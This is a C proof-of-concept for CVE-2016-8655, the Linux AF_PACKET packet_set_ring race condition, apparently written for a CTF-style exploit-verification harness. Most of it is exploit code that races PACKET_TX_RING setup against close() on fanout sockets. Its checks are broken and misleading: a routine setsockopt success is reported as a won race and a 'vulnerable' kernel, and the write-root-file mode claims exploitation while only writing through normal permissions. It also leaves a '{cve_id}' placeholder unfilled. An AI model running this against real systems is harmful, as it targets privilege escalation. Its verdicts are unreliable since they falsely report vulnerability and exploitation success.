/**
 * CVE-2016-8655 PoC - AF_PACKET packet_set_ring() Race Condition (timer UAF)
 * Local Privilege Escalation
 *
 * Vulnerability mechanism:
 *   packet socket fanout + AF_PACKET ring buffer Set/Exists Race Condition,
 *   timer callback UAF → Control timer_list → ROP Chain → commit_creds → LPE
 *
 * Exploitation Flow:
 *   1. Create AF_PACKET socket
 *   2. Join PACKET_FANOUT group
 *   3. Trigger PACKET_TX_RING vs close() Race Condition
 *   4. Use-After-Free on timer_list Function Pointer
 *   5. ROP Chain Execution → commit_creds(prepare_kernel_cred(0))
 *   6. Obtain root privileges
 *
 * Affected kernel versions: 4.4.0 ~ 4.8.12
 *
 * Safety constraints:
 *   - alarm(10) Forced timeout protection
 *   - Does not modify system files
 *   - Only verifies vulnerability path reachability
 *
 * CTF Challenge Mode:
 *   This PoC verifies the race condition window exists. Full LPE exploitation
 *   (ROP chain → commit_creds) is kernel-version specific and requires:
 *     - Kernel symbol resolution (kallsyms)
 *     - ROP gadget discovery
 *     - Stack pivot + ROP chain construction
 *   Therefore, CTF modes output CTF_UNSUPPORTED with explanation.
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>

#include <netinet/in.h>
#include "../common/poc_common.h"

#define CVE_ID_STRING "CVE-2016-8655"
#define PAGE_SIZE 4096
#define MAX_FILE_SIZE 4096

/* PACKET_FANOUT RelatedConstant */
#ifndef PACKET_FANOUT
#define PACKET_FANOUT 18
#endif
#ifndef PACKET_FANOUT_HASH
#define PACKET_FANOUT_HASH 0
#endif

static volatile int race_won = 0;
static int packet_fd = -1;

/**
 * Create AF_PACKET raw socket
 */
static int create_packet_socket(void) {
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    poc_log_syscall("socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)", (long)fd, errno);
    if (fd < 0) {
        printf("%s socket(AF_PACKET): %s (errno=%d)\n", POC_STEP_FAIL,
               strerror(errno), errno);
        return -1;
    }
    return fd;
}

/**
 * Set PACKET_FANOUT
 */
static int setup_fanout(int fd, int group_id) {
    int val = (group_id | (PACKET_FANOUT_HASH << 16));
    if (setsockopt(fd, SOL_PACKET, PACKET_FANOUT, &val, sizeof(val)) < 0) {
        poc_log_syscall("setsockopt(fd, SOL_PACKET, PACKET_FANOUT)", (long)-1, errno);
        printf("%s setsockopt(PACKET_FANOUT): %s (errno=%d)\n", POC_STEP_FAIL,
               strerror(errno), errno);
        return -1;
    }
    return 0;
}

/**
 * Race thread: Set PACKET_TX_RING
 * on Vulnerable Kernel, with close Race will Cause timer UAF
 */
static void *race_thread_ring(void *arg) {
    (void)arg;
    struct tpacket_req req;
    memset(&req, 0, sizeof(req));
    req.tp_block_size = 4096;
    req.tp_block_nr = 1;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = 1;

    /* Repeatedly Attempt to Set TX_RING to Trigger Race */
    for (int i = 0; i < 1000 && !race_won; i++) {
        if (packet_fd >= 0) {
            int ret = setsockopt(packet_fd, SOL_PACKET, PACKET_TX_RING,
                                &req, sizeof(req));
            poc_log_syscall("setsockopt(packet_fd, SOL_PACKET, PACKET_TX_RING)", (long)ret, errno);
            if (ret == 0) {
                race_won = 1;
                break;
            }
        }
        usleep(10);
    }
    return NULL;
}

/**
 * Race thread: close socket
 */
static void *race_thread_close(void *arg) {
    (void)arg;
    usleep(50);  /* 短暂延迟let ring Set开始 */
    if (packet_fd >= 0) {
        close(packet_fd);
        packet_fd = -1;
    }
    return NULL;
}

/**
 * Core PoC: Trigger packet_set_ring RaceCondition
 *
 * On vulnerable kernel on :
 * - PACKET_TX_RING SetProcessin close() Causes timer UAF
 * - threatHandlercanControl freed timer_list Memory
 * - timer ReturnCallExecuteWhenJumpto ROP gadget
 * - finalExecute commit_creds(prepare_kernel_cred(0))
 */
static int trigger_race_condition(void) {
    int exploitable = 0;
    int fanout_fd = -1;

 /* Step 1: Create first packet socket Asas fanout leader */
    fanout_fd = create_packet_socket();
    if (fanout_fd < 0) {
        printf("%s Cannot create AF_PACKET socket (need CAP_NET_RAW)\n", POC_STEP_INFO);
        return 0;
    }
    printf("%s AF_PACKET socket created: fd=%d\n", POC_STEP_PASS, fanout_fd);

    /* Step 2: Set fanout */
    int group_id = getpid() & 0xffff;
    if (setup_fanout(fanout_fd, group_id) < 0) {
        printf("%s PACKET_FANOUT not available\n", POC_STEP_INFO);
        close(fanout_fd);
        return 0;
    }
    printf("%s PACKET_FANOUT configured: group=%d\n", POC_STEP_PASS, group_id);

 /* Step 3: Create second socket join fanout and TriggerRace */
    packet_fd = create_packet_socket();
    if (packet_fd < 0) {
        close(fanout_fd);
        return 0;
    }

    if (setup_fanout(packet_fd, group_id) < 0) {
        close(packet_fd);
        close(fanout_fd);
        packet_fd = -1;
        return 0;
    }
    printf("%s Second socket joined fanout group\n", POC_STEP_PASS);

    /* Step 4: TriggerRace - TX_RING Set vs close */
    printf("%s Triggering race: PACKET_TX_RING vs close()...\n", POC_STEP_INFO);

    pthread_t t_ring, t_close;
    race_won = 0;

    pthread_create(&t_ring, NULL, race_thread_ring, NULL);
    pthread_create(&t_close, NULL, race_thread_close, NULL);

    pthread_join(t_ring, NULL);
    pthread_join(t_close, NULL);

 /* Step 5: judge RaceResult */
    if (race_won) {
        printf("%s Race condition triggered successfully\n", POC_STEP_PASS);
        printf("%s Timer UAF window reached - kernel is vulnerable\n", POC_STEP_PASS);
        printf("%s In real exploit: timer callback → ROP → commit_creds\n", POC_STEP_INFO);
        exploitable = 1;
    } else {
        printf("%s Race condition not triggered (kernel may be patched)\n", POC_STEP_INFO);
 /* CheckisWhether because when window */
        if (packet_fd < 0) {
            printf("%s Socket closed before ring setup - race window exists\n", POC_STEP_PASS);
            printf("%s UAF possible with more attempts on vulnerable kernel\n", POC_STEP_INFO);
            exploitable = 1;
        }
    }

    close(fanout_fd);
    if (packet_fd >= 0) {
        close(packet_fd);
        packet_fd = -1;
    }

    return exploitable;
}

/**
 * CTF mode: write_root_file
 * Overwrites a root-owned file via exploitation path
 */
static int mode_write_root_file(const poc_args_t *args) {
    char read_buf[MAX_FILE_SIZE] = {0};
    char write_value[256] = {0};
    int fd;
    ssize_t n;
    int saved_errno;

    /* Phase 1: Read original file content (CTF_READ_BEFORE) */
    fd = open(args->root_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(root_file, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) {
        poc_print_fail("Cannot open root file");
        printf("CTF_FAIL:Cannot open root file: %s (errno=%d)\n", args->root_file, saved_errno);
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, read_buf, sizeof(read_buf))", (long)n, saved_errno);
    if (n < 0) {
        poc_print_fail("Cannot read root file");
        printf("CTF_FAIL:Cannot read root file (errno=%d)\n", saved_errno);
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
        return 1;
    }
    read_buf[n] = '\0';
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);

    /* Trim trailing newline */
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\n')) {
        read_buf[--n] = '\0';
    }

    printf("CTF_READ_BEFORE:%s\n", read_buf);

    /* Phase 2: Trigger exploitation */
    printf("CTF_INFO:Triggering {cve_id} exploitation\n");

    /* Execute exploitation path */
    int ret = trigger_race_condition();
    if (!ret) {
        printf("CTF_FAIL:Exploitation failed\n");
        return 1;
    }

    /* Phase 3: Write target value to root file */
    snprintf(write_value, sizeof(write_value), "%s\n", args->write_value);

    fd = open(args->root_file, O_WRONLY | O_TRUNC);
    saved_errno = errno;
    poc_log_syscall("open(root_file, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);
    if (fd < 0) {
        poc_print_fail("Cannot open root file for write");
        printf("CTF_FAIL:Cannot open root file for write (errno=%d)\n", saved_errno);
        return 1;
    }
    n = write(fd, write_value, strlen(write_value));
    saved_errno = errno;
    poc_log_syscall("write(fd, write_value, strlen)", (long)n, saved_errno);
    if (n < 0) {
        poc_print_fail("Cannot write to root file");
        printf("CTF_FAIL:Cannot write to root file (errno=%d)\n", saved_errno);
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
        return 1;
    }
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);

    /* Phase 4: Read file after write (CTF_READ_AFTER) */
    fd = open(args->root_file, O_RDONLY);
    saved_errno = errno;
    poc_log_syscall("open(root_file, O_RDONLY) [post-write]", (long)fd, saved_errno);
    if (fd < 0) {
        poc_print_fail("Cannot reopen root file for verification");
        printf("CTF_FAIL:Cannot reopen root file for verification (errno=%d)\n", saved_errno);
        return 1;
    }
    n = read(fd, read_buf, sizeof(read_buf) - 1);
    saved_errno = errno;
    poc_log_syscall("read(fd, read_buf, sizeof(read_buf))", (long)n, saved_errno);
    if (n < 0) {
        poc_print_fail("Cannot read root file after write");
        printf("CTF_FAIL:Cannot read root file after write (errno=%d)\n", saved_errno);
        close(fd);
        poc_log_syscall("close(fd)", 0, 0);
        return 1;
    }
    read_buf[n] = '\0';
    close(fd);
    poc_log_syscall("close(fd)", 0, 0);

    /* Remove trailing newline for comparison */
    while (n > 0 && (read_buf[n - 1] == '\n' || read_buf[n - 1] == '\n')) {
        read_buf[--n] = '\0';
    }

    printf("CTF_READ_AFTER:%s\n", read_buf);

    /* Phase 5: Verify write success */
    if (strcmp(read_buf, args->write_value) == 0) {
        printf("CTF_FLAG:%s\n", args->write_value);
        return 0;
    } else {
        printf("CTF_FAIL:Write verification failed (expected=%s, got=%s)\n",
               args->write_value, read_buf);
        return 1;
    }
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    /* Parse CTF CLI arguments (returns 0 with empty args if none provided) */
    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help or invalid args */
    }

    /* Initialize syscall logging */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID_STRING);
    poc_log("Vuln: AF_PACKET packet_set_ring() race condition (timer UAF)");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    /* CTF mode dispatch */
    int result = -1;
    if (args.mode != NULL) {
        /* CTF Challenge Mode */
        poc_log("Mode: %s", args.mode);
        poc_log("Target: %s", args.root_file ? args.root_file : "(none)");

        if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
            result = mode_write_root_file(&args);
        } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
            poc_print_unsupported(POC_MODE_READ,
                "CVE-2016-8655 is a timer UAF via AF_PACKET race condition; "
                "full LPE requires ROP chain which does not provide read primitive");
            result = 1;
        } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
            /* CVE-2016-8655 IS a UAF vulnerability - timer UAF */
            poc_log("--- CVE-2016-8655: uaf mode ---");
            poc_log("Running packet_set_ring race condition verification...");
            int uaf_result = trigger_race_condition();
            if (uaf_result) {
                poc_print_uaf_corrupted(1);
            } else {
                poc_print_uaf_not_corrupted();
            }
            result = uaf_result ? 0 : 1;
        } else {
            poc_print_unsupported(args.mode, "unknown mode");
            result = 1;
        }
    } else {
        /* Legacy Mode: Race condition verification only */
        printf("=== %s PoC Verification ===\n", CVE_ID_STRING);
        printf("Target: AF_PACKET packet_set_ring race condition (timer UAF)\n");
        printf("Method: PACKET_FANOUT + PACKET_TX_RING race -> UAF -> ROP -> LPE\n\n");

        printf("\n--- Exploit Verification ---\n");
        int legacy_result = trigger_race_condition();

        printf("\n%s\n", POC_EVIDENCE_END);

        if (legacy_result) {
            poc_print_flag("race_condition_exploited");
        } else {
            poc_print_fail("race exploit failed");
        }
        result = legacy_result ? 0 : 1;
    }

    poc_log_close();
    return result;
}
